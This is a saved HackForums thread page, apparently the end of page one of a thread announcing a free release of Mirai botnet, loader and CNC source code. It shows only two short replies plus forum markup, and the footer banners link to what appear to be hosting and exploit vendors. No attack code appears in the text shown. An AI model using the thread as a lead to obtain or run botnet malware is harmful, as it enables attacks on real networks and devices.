+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=3201035&amp;pid=52616056&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=3201035" title="Hacker Game Anna-senpai Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52616056);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52616056#pid52616056" id="post_url_52616056" title="*" rel="nofollow">#14</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:24 PM <span class="post_edit" id="edited_by_52616056"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52616056">
+		<blockquote class="mycode_quote"><cite><span> (09-30-2016, 08:22 PM)</span>Jasоn Wrote: <a href="https://hackforums.net/showthread.php?pid=52616037#pid52616037" class="quick_jump">&nbsp;</a></cite>STOP BEING A TEASE.<br>
+[img]http://image.prntscr.com/image/337e91bc2fba42c4afe5738284b54dea.png[/img]</blockquote><br>
+Really? It working for me. maybe hotlink protection? Try posting it directly in browser.
+	</div>
+	
+	
+	</div></div>
+	
+<div style="" id="tyl_52616056"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=3201035" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52616056);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52616088" id="pid52616088"></a>
+<div class="post classic  clear" style="" id="post_52616088">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2499922" title="/pH/ joined Nov 2014"><img src="page1_files/default_avatar_002.png" alt="/pH/" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2499922"><span class="group9">/pH/</span></a></span></strong> 
+<a href="https://hackforums.net/member.php?action=profile&amp;uid=2499922" title="Away"><img src="page1_files/buddy_away.png" alt="Away" class="buddy_status" border="0"></a>
+<br>
+			<span class="smalltext">
+				Judoka.<br>
+				<img src="page1_files/star.gif" alt="*" border="0"><img src="page1_files/star.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/L33t.png" alt="HF l33t" title="HF l33t">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_85" title="A lucky member from a post in thread 5441773."></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">459</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">42</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2499922" title="Business Rating of /pH/"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2499922" rel="nofollow"><strong class="reputation_neutral">0</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2499922&amp;pid=52616088&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2499922" title="Hacker Game /pH/ Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52616088);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52616088#pid52616088" id="post_url_52616088" title="*" rel="nofollow">#15</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:26 PM <span class="post_edit" id="edited_by_52616088"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52616088">
+		Can't say I expected this. gg.
+	</div>
+	
+	
+<div class="signature scaleimages">
+<div style="text-align: center;" class="mycode_align"><span style="color: #006400;" class="mycode_color"><span style="font-size: medium;" class="mycode_size"><span style="font-family: Courier;" class="mycode_font">Eat, Sleep, Grapple.</span></span></span></div>
+meme of the week<br>
+<blockquote class="mycode_quote"><cite>Mr Whiskey Wrote:</cite>Nah he's talkin bout the first nut that takes like 3 minutes, how long do you wait after that is his question.</blockquote><br>
+
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52616088"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2499922" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2499922" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52616088);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+	</div>
+</td></tr>
+		<tr>
+			<td class="tfoot">
+				
+	<div class="float_right">
+		<form action="search.php" method="post">
+			<input type="hidden" name="action" value="thread">
+			<input type="hidden" name="tid" value="5420472">
+			<input type="text" name="keywords" value="Enter Keywords" onfocus="if(this.value == 'Enter Keywords') { this.value = ''; }" onblur="if(this.value=='') { this.value='Enter Keywords'; }" class="textbox" size="25">
+			<input type="submit" class="button" value="Search Thread">
+		</form>
+	</div>
+
+				<div class="mobile-remove">
+					<strong><i class="fa fa-angle-double-left"></i> <a href="https://hackforums.net/showthread.php?tid=5420472&amp;action=nextoldest" rel="nofollow">Next Oldest</a> | <a href="https://hackforums.net/showthread.php?tid=5420472&amp;action=nextnewest" rel="nofollow">Next Newest</a> <i class="fa fa-angle-double-right"></i></strong>
+				</div>
+			</td>
+		</tr>
+	</tbody></table>
+</article>
+	<div class="float_left">
+		
+<div class="pagination">
+
+ <span class="pagination_current">1</span>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=2" class="pagination_page">2</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=3" class="pagination_page">3</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=4" class="pagination_page">4</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=5" class="pagination_page">5</a>
+
+...  <a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=36" class="pagination_last">36</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=2" class="pagination_next">Next »</a>
+
+<div class="popup_menu drop_go_page" style="display: none;" id="go_page_2_popup">
+	<label for="page">Jump to page:</label> <input type="text" class="textbox" name="paginationPageNum" value="1" size="4" style="min-width: 20px !important;">
+	<button class="button" type="button" onclick="paginationJumpGo($(this));">Go</button>
+</div>
+<a href="javascript:;" class="go_page" title="Jump to page" id="go_page_2"><i class="fa fa-chevron-down"></i></a>&nbsp;
+<script type="text/javascript">
+	function paginationJumpGo(paginationJumpNum) {
+		var new_page_num = parseInt(paginationJumpNum.prev().val());
+		if(isNaN(new_page_num)) {
+			new_page_num = 1;
+		}
+		window.open("https://hackforums.net/showthread.php?tid=5420472&page=" + new_page_num, "_self")
+	}
+
+	var go_page = 'go_page_' + $(".go_page").length;
+	$(".go_page").last().attr('id', go_page);
+	$(".drop_go_page").last().attr('id', go_page + '_popup');
+	$('#' + go_page).popupMenu(false).click(function() {
+		var drop_go_page = $(this).prev('.drop_go_page');
+		if (drop_go_page.is(':visible')) {
+			drop_go_page.find('.textbox').focus();
+		}
+	});
+</script>
+
+</div>
+
+	</div>
+	<div style="padding-top: 4px;" class="float_right">
+		
+<a href="https://hackforums.net/newreply.php?tid=5420472" class="button closed_button" rel="nofollow"><span>Thread Closed</span></a>&nbsp;
+
+	</div>
+	<br class="clear">
+	
+	
+	
+	<br>
+	<div class="float_left">
+		<ul class="thread_tools">
+			<li class="printable"><a href="https://hackforums.net/printthread.php?tid=5420472" title="Print - [FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release">View a Printable Version</a></li>
+			<li class="pdf"><a href="https://hackforums.net/pdf.php?tid=5420472" title="PDF - [FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release">Export as PDF</a></li>
+			
+			<li class="subscription_add"><a href="https://hackforums.net/usercp2.php?action=addsubscription&amp;tid=5420472&amp;my_post_key=01ce07b2d23227f1c6a1c694d6e27f8e" rel="nofollow" title="Manage Subscription - [FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release">Subscribe to this thread</a></li>
+			
+		</ul>
+	</div>
+
+	<div class="float_right" style="text-align: right;">
+		
+	</div>
+	<br class="clear">
+	
+	
+<div class="mam-footerbig scaleimages" align="center"><script type="text/javascript">
+		amzn_assoc_ad_type = "banner";
+		amzn_assoc_marketplace = "amazon";
+		amzn_assoc_region = "US";
+		amzn_assoc_placement = "assoc_banner_placement_default";
+		amzn_assoc_campaigns = "computers_accesories";
+		amzn_assoc_banner_type = "category";
+		amzn_assoc_p = "42";
+		amzn_assoc_isresponsive = "false";
+		amzn_assoc_banner_id = "01P7BXJ6BWD5V0KXBZG2";
+		amzn_assoc_width = "234";
+		amzn_assoc_height = "60";
+		amzn_assoc_tracking_id = "multimedia2-20";
+		amzn_assoc_linkid = "7aad41f5e81786cf19de6360f0ee67c6";
+	</script>
+	<script src="page1_files/q.js"></script></div>
+<div class="mam-footersmall scaleimages" align="center"><a href="https://thesealhosting.com/" target="_blank"><img src="page1_files/142.gif"></a><a href="https://thesealexploit.com/" target="_blank"><img src="page1_files/87.gif"></a></div>
+
+	</div>
+</div>
+<div id="footer">
+	<div class="upper">
+		<div class="wrapper">
+			
+			<ul class="menu bottom_links">
+				
+<li><a href="https://hackforums.net/contact.php">Contact Us</a></li>
+
+				<li><a href="https://hackforums.net/">Hack Forums</a></li>
+				<li><a href="#top">Return to Top</a></li>
+                                <li><a href="https://hackforums.net/myawards.php" rel="nofollow">Awards</a></li>
+                                <li><a href="https://hackforums.net/misc.php?action=markread&amp;my_post_key=01ce07b2d23227f1c6a1c694d6e27f8e" rel="nofollow">Mark All Forums Read</a></li>
+                                <li><a href="https://hackforums.net/stats.php" title="Hack Forums Statistics">Statistics</a></li>
+                                <li><a href="https://hackforums.net/showstaff.php" title="Hack Forums Staff">Staff</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="lower">
+		<div class="wrapper">
+			<span id="copyright">Powered By <a href="https://www.mybb.com/" target="_blank" rel="noopener">MyBB</a> - <a href="https://hackforums.net/" target="_blank">HackForums</a>, © 2002-2019</span>
+		</div>
+	</div>
+</div>
+
+
+<script type="text/javascript">if(MyBB) { $([document, window]).bind("load", function() { MyBB.detectDSTChange('0'); }); }</script>
+
+</div>
+
+	<div id="thread_modes_popup" class="popup_menu" style="display: none;">
+<div class="popup_item_container"><a href="javascript:void(0)" onclick="MyBB.whoPosted(5420472); return false;" class="popup_item" rel="nofollow">Who Posted</a></div>
+<div class="popup_item_container"><a href="https://hackforums.net/showthread.php?tid=5420472&amp;mode=single" class="popup_item" rel="nofollow">Your Posts</a></div>
+<div class="popup_item_container"><a href="https://hackforums.net/usercp2.php?action=addsubscription&amp;tid=5420472&amp;my_post_key=01ce07b2d23227f1c6a1c694d6e27f8e" class="popup_item" rel="nofollow">Subscribe to this thread</a></div>
+<div class="popup_item_container"><a href="https://hackforums.net/printthread.php?tid=5420472" class="popup_item">View a Printable Version</a></div>
+</div>
+	<script type="text/javascript">
+	// <!--
+		if(use_xmlhttprequest == "1")
+		{
+			$("#thread_modes").popupMenu();
+		}
+	// -->
+	</script>
+	<script type="text/javascript">
+		$(".author_avatar img").error(function () {
+			$(this).unbind("error").closest('.author_avatar').remove();
+		});
+	</script>
+<script type="text/javascript">
+			jQuery.fn.selectText = function(){   
+				var element = this[0];
+				if (document.body.createTextRange) {
+					var range = document.body.createTextRange();
+					range.moveToElementText(element);
+					range.select();
+				} else if (window.getSelection) {
+					var selection = window.getSelection();        
+					var range = document.createRange();
+					range.selectNodeContents(element);
+					selection.removeAllRanges();
+					selection.addRange(range);
+				}
+			};
+
+			$(function() {
+				$('.copynotice').click(function() {
+					thisCode = $(this).parent().parent().find('.phpcode');
+					$(thisCode).selectText();
+					document.execCommand('copy');
+					$(this).after('<span style="color: #4caf50; font-size: 12px; font-weight: bold; margin-left: 11px;">Copied!</span>');
+				});
+
+				$('.phpcode').dblclick(function() {
+					$(this).selectText();
+				});
+			});
+		</script>
+<script type="text/javascript" src="page1_files/select2.js"></script>
+
+
+</body></html>
